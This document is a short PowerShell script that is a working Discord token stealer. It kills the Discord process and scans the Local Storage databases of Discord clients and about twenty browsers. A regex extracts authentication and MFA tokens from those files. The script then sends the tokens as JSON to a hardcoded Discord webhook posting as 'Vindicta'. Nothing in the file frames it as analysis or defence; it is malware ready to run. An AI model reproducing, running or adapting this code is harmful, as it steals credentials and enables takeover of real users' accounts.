@echo off
$hook  = "https://discord.com/api/webhooks/1447250201348800572/DXl-0ziQNpzC0vL5CcWEK6a30SNpfs7t7wBM-XhBMlxWObDc_OaZb3UsPWJp3U9JBz3F"
$token = new-object System.Collections.Specialized.StringCollection
Stop-Process -Name "Discord" -Force

$db_path = @(
    $env:APPDATA + "\Discord\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"
    $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb"

    $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb"
    $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb"
    $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
)

foreach ($path in $db_path) {
    if (Test-Path $path) {
        foreach ($file in Get-ChildItem -Path $path -Name) {
            $data = Get-Content -Path "$($path)\$($file)"
            $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
            $match = $regex.Match($data)

           while ($match.Success) {
                if (!$token.Contains($match.Value)) {
                    $token.Add($match.Value) | out-null
                }

               $match = $match.NextMatch()
            }
        }
    }
}

$content = "**Client: %ip%**``` "
foreach ($data in $token) {
    $content = [string]::Concat($content, "`n", $data)
}
$content = [string]::Concat($content, "``` ")

$JSON = @{ "content"= $content; "username"= "Vindicta"; "avatar_url"= "https://wallpapercave.com/wp/wp8715191.jpg" }  | convertto-json
Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"}
pause
